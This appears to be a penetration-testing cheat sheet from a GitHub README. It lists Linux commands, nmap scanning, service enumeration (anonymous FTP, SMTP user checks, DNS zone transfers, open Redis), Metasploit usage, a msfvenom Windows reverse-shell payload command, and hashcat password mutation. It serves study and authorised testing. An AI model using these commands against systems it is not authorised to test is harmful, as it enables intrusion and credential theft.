# Ethical Hacking Cheat Sheet
A cheat sheet for ethical hacking created by Alan Shiah.


![9d9bd13afce1a798d22ecfd9897730ed](https://github.com/shiahalan/Ethical-Hacking-Cheat-Sheet/assets/102575877/ce271435-83a5-492f-b7d2-394d1a33d1f1)
## OSINT (Open-Source Intelligence) 🔎

## Linux Commands 📜
#### sudo: Run the following command as a super-user.
```
sudo <command>
```
##### -=Switch To Root=-
```
sudo su
```

#### su: Used to switch users.
```
su <username>
```

#### ls: Used to list out directories.
```
ls <optional, /path>
```
##### -=Flags=-
-l = Long List Formatting (show more information),
-a = All (list all files/directories, including hidden ones)

#### pwd: Used to print the working directory.
```
pwd
```

#### cd: Used to change directories.
```
cd <directory name, /path>
```

#### mkdir: Used to make a new directory.
```
mkdir <name>
```

#### mv: Used to either move a file/directory or rename a file.
```
mv <filename/directory name> </path>
```
```
mv <filename> <new filename>
```

#### cp: Used to copy a file to another file/destination.
```
cp <filename> <destination file name>
```
```
cp <filename> <directory name>
```

#### rm: Used to remove files or directories.
```
rm <filename>
```
```
rm -r <directory name>
```
##### -=Flags=-
-r = recursive (deletes a directory and all files/directories inside)

#### touch: Creates a blank empty file.
```
touch <filename>
```

#### cat: Displays the contents of a file onto the terminal output.
```
cat <filename>
```

#### clear: Clears the terminal display.
```
clear
```

#### echo: Prints out any text following the command.
```
echo <text>
```

#### man: Used to access the manual for a certain command.
```
man <command name>
```

#### whoami: Outputs the username of the active user. Beware, as this command is usually marked as suspicious to IDS/IPS.
```
whoami
```

#### zip: Used to zip and compress a file.
```
zip <filename>
```

#### unzip: Used to unzip and extract .zip files.
```
unzip <filename>
```

#### grep: Used to search for a specified string.
```
grep <string>
```
```
grep <string> <filename>
```
##### -=Flags=-
-r = Recursive (looks through all directories and files starting from current directory), -l Lists Files (lists out files containing the string)

#### chmod: Used to change file permissions for a specified file.
```
chmod <flags> <filename>
```
##### -=Flags=-
-x = Not Executable, -r = Not Readable, -w = Not Writable, +x = Executable, +r Readable, +w Writable, 600 = (No one else can access the file except owner, use on RSA keys when SSH)

#### wget: Used to directly download files from the internet.
```
wget <url>
```

#### scp: Also known as secure copy, is used to copy files securely between servers.
```
scp <user@host>:</path> </destination path>
```
```
scp <user1@host1>:</path> <user2@host2>:</destination path>
```

#### file: Checks a file's type and lists relevant file content information.
```
file <filename>
```

#### nano: Opens a basic terminal based text editor that can be used to edit files.
```
nano <filename>
```

#### find: Outputs the location of a specified file/directory.
```
find <filename/directory name>
```

#### |: Also known as pipe, this command takes the output of one command and then puts it into the input of another.
```
<first command> | <second command>
```


## Windows Commands 📜
#### powershell: This command starts up the PowerShell command line/script interpreter. Use this if you are more comfortable working with Linux/Bash-like commands rather than Command Prompt's commands. Not all Windows machines support this command.
```
powershell
```

## Enumeration 🌐

### Network Enumeration

#### Ping: Does an ICMP echo to target IP to checks if target is up. Also provides TTL (Time to live) info, revealing OS information.
```
ping <target_ip>
```
##### -=TTL=-
ttl 64 = Linux, ttl 128 = Windows, ttl 255 = Network device

#### nmap: Network mapper. Can be used to enumerate a target's ports and much more. By default, it scans the top 1000 most common ports.
```
nmap <target_ip>
```
```
nmap -sV --script vuln -p <port> <target IP>
```
##### -=Flags=-
-sV = Service Scan,
-sS = SYN Scan,
-sA = ACK Scan,
-sT = TCP Scan,
-sU = UDP Scan (some services run on UDP connections),
-sC = Run Default Scripts,
-Pn = Don't send ping probes,
-p = Port (-p- scans all ports),
-T = Speed, 1-5 with 5 being the fastest (3 is default),
-F = Top 100 ports,
--source-port <port> = Send requests from this port (some firewalls block all traffic except for whitelisted ports, try port 53),
--script <name/category> = Execute a specific script or scripts from a certain category


### Port Enumeration

#### Port 21: FTP
FTP or File Transfer Protocol is commonly hosted on port 21. It allows the transfer of computer files following a client to server model.
```
ftp <target IP>
```
##### -=Anonymous Login=-
You may login to ftp using a guest account without a password under the username anonymous. anonymous:NONE

##### -=Commands=-
get = (Used to download specified file), put = (Used to upload specified file)
```
ftp> get <filename>
```
```
ftp> put <filename>
```

#### Port 22: SSH
SSH or Secure Shell is a service that provides the ability to remotely login to a computer and securely send commands. Meaning, that this service can be used in public networks.
```
ssh <username@target IP>
```
##### -=Flags=-
-i = Identity File (used to authenticate a user without a password given a private key (for example id_RSA), make sure to chmod 600 the id_rsa file (or whatever it's named) or ssh will not accept it)
```
ssh <username@target IP> -i <filename>
```
##### PuTTYgen
To connect to an openSSH session using a PuTTYgen generated private key, you must export the PuTTYgen private key to the openSSH private key file format.
```
puttygen <keyfile> -O private-openssh -o <id_rsa/keyfile name>
```

#### Port 23: Telnet
Like SSH, Telnet is a service that provides the ability to send commands to a remote computer. However, unlike SSH, Telnet sends commands in plaintext. Therefore, Telnet should only be used in private networks.
```
telnet <target IP> <optional, port>
```
```
telnet -l <username> <target IP> <optional, port>
```
##### -=Flags=-
-l = User (username of the user you wish to login as)

#### Port 25: SMTP (Simple Mail Transfer Protocol)
SMTP, or Simple Mail Transfer Protocol is an internet mail protocol used to send and retrieve electronic mail. 
There are various ways to connect to SMTP, with telnet being one of them.
```
telnet <target IP> 25
EHLO ALL
VRFY <username>
```
#### Port 53: DNS
DNS, also known as Domain Name System is a service that allows for the querying of domain names. DNS servers runs on this port, while also sending replies to clients on the same port. Therefore, the client needs to have port 53 open in order to query and receive information from a DNS server. Through port 53, queries about domain names are transmitted and received. Additionally, DNS servers use port 53 for zone transfers through TCP and more.
```
dig any <domain name> @<target ip>
```
```
dig TXT <domain name> @<target ip>
```
```
dig axfr <domain name> @<target ip>
```
#### -=Options=-
any = (lists A=IPv4, AAAA=IPv6, TXT record, NS = name server, SOA = State of Authority record and zone information, etc), TXT = Text Record (A text record for various uses), axfr = Asynchronous Full Zone Transfer (lists out related hosts/subdomains/files in Master/Slave system)

#### Ports 80, 8080, 443: HTTP/S
HTTP and HTTPS stand for Hypertext Transfer Protocol and Hypertext Transfer Protocol Secure. It is used to load web pages, such as HTML documents onto a browser. In other words, HTTP and HTTPS is used for loading up websites onto the internet to view through a browser client.

To access a website, you can simply put the domain name or IP address into a web browser's URL field.
```
<domain name/IP>
```
```
<domain name/IP>:<port>
```

#### Port 6379: Redis
Redis is an open-source in-memory type database. Due to it being in-memory, it is faster than a traditional database. It uses a key-value system.
```
redis-cli -h <target IP>
```
##### -=Commands=-
info = Information (lists information about the database such as version, number of keys, etc.), keys * = Keys All (lists all the keys in the database), get = Get (get the content for a specified key), select = Select (selects the database)
```
<IP of Target>:6379> info
```
```
<IP of Target>:6379> keys *
```
```
<IP of Target>:6379> get <key name (not number)>
```
```
<IP of Target>:6379> select <database number/name>
```
##### -=Additional Comments=-
If you don't have the redis-cli command, then you need to install redis-tools. This can be done as so on Linux:
```
sudo apt install redis-tools
```

## Exploitation 💥
### Metasploit
Metasploit is a penetration testing framework and computer security project that provides information on exploits and security vulnerabilities. It contains a plethora of different useful tools for enumeration, exploitation, exploit creation, IDS evasion, and more.

#### msfconsole: Metasploit framework console, starts up the metasploit framework console on a terminal.
```
msfconsole
```
Quiet mode, don't display startup banner...
```
msfconsole -q
```

##### -=Flags=-
-q = Quiet (does not print banner on startup), -h = Help (displays help menu for command usage and flags)

##### -=Commands=-
use = Use (select a payload to use, can use payload number or path), show options = Show Options (displays the options that can be set for a specified payload, use once payload is selected), set = Set (set the option specified to a specified value), search = Search (searches for payloads given keywords, can select type to search for like so: search exploit <keyword>, search auxiliary <keyword>), show targets = Show Targets (displays all targets that can be exploited using the selected payload, can set target using set command), run = Run (executes the payload), exploit = Exploit (same as run command)
```
msf6> search exploit <exploit name>
```
```
msf6> use <exploit number, exploit path>
```
```
msf6 exploit(some/exploit/path)> show options
```
```
msf6 exploit(some/exploit/path)> set <option name> <option value>
```
```
msf6 exploit(some/exploit/path)> run
```
```
msf6 exploit(some/exploit/path)> exploit
```
```
msf6 exploit(some/exploit/path)> show targets
```

##### -=Meterpreter=-
help = Help (displays a help menu for meterpreter, listing things that can be done with it such as evasion, persistence, and more useful things), shell = Shell (drops you into a shell on the target), sessions = Sessions (lists the sessions of meterpreter that are available... You can put a meterpreter session in the background using ctrl + z... To interact with a session you can use: sessions -i <sessionID>)
```
meterpreter> help
```
```
meterpreter> shell
```
```
meterpreter> sessions
```
```
meterpreter> sessions -i <sessionID>
```


#### msfvenom: Metasploit framework venom, is a combination of modules msfpayload and msfencode. It allows the creation of payloads, while also aiding in the payloads' encoding to evade IDS detection.
```
msfvenom -h
```
Lists payloads available:
```
msfvenom -l payloads
```
Lists encoders availabe:
```
msfvenom -l encoders
```
Example Windows Reverse Shell:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
```
##### -=Flags=-
-l = List (lists out the specified category/etc), -h = Help (displays a help menu for msfvenom usage and flags), -p = Payload (specifies the payload type)

### Password Attacks
Cracking a password is mostly based upon educated guessing, heavily depending on the target's predictability or inclination towards simplicity when creating a password.
Certain services are not worth attempting to bruteforce due to the sheer amount of time it will consume. Some common services and their bruteforcing speeds are as follows:  
Fastest: Kerberos, LDAP  
Fast: HTTP/S, FTP  
Medium: SMB  
Slow: RDP  
Very Slow: SSH  

#### Password Mutations
In order to become more secure, services may require certain password requirements. For example, a length of 8+ characters, a capital letter, a special character, numbers, and more. However, people tend to incline towards simplicity and often have predictable patterns for creating a new password that matches these requirements. For example, capitalizing the first letter, adding 123/year/month to the end of the password, or adding an exclamation mark to the end of the password. We can therefore create a new list of passwords to bruteforce using these mutations.
```
hashcat --force <password file>.list -r <mutation rule file>.rule --stdout | sort -u > mutated_password.list
```
One of the most commonly used rules for password mutation is best64.rule, included by default in both John and Hashcat.


#### 

## Reverse Engineering 🔄

WRITE STUFF HERE ABOUT OBJDUMP, STRINGS, ASSEMBLY, GHIDRA

## Miscellaneous 🛠️
### JavaScript and Node.JS
#### Read Local Files
```
require('fs').readFileSync('</path>');
```
##### -=Convert Output To String=-
```
require('fs').readFileSync('</path>').toString();
```
```
new String(require('fs').readFileSync('</path>'));
```

### Git and GitHub
#### How to Initialize and Forward Local Repository to GitHub
To initiate a GitHub repository, login to the website and create a new repository. Then, to initialize your local repository and forward it to your GitHub repository, you can do the following:
```
git init
```
-----
```
git add <filename, . to add all>
```
OR
```
git add .
```
-----
```
git commit -m "Commit message here for logs"
```
```
git branch -M main
```
```
git remote add origin https://github.com/username/some-repository.git
```
```
git push -u origin main
```
##### -=Options=-
init = Initialize (initializes/creates a git repository in the current working directory as .git hidden file), add = Add (adds a specified file/directory, or using . adds every file in current directory, to the staging area where it is being prepared to commit... note that only staged files will be pushed to the updated repository on commit), commit = Commit (commits and finalizes a repository update on local repository, usually with a commit message), branch = Branch (used for various commands that relate to branches, such as switching, adding, deleting, etc.), remote = Remote (used to interact with a remote repository, usually on GitHub), push = Push (pushes the currently selected branch's local repository to some main repository, usually a GitHub online repository), status = Status (will display information regarding files in the staging area, files that have been changed and not added to the staging area, or if nothing has changed, then the directory is described as clean), log = Log (displays a chronological commit history for the repository), diff = Difference (displays the differences between various things like files, directories, branches, and more)
```
git log
```
```
git diff <optional> <optional>
```
```
git status
```



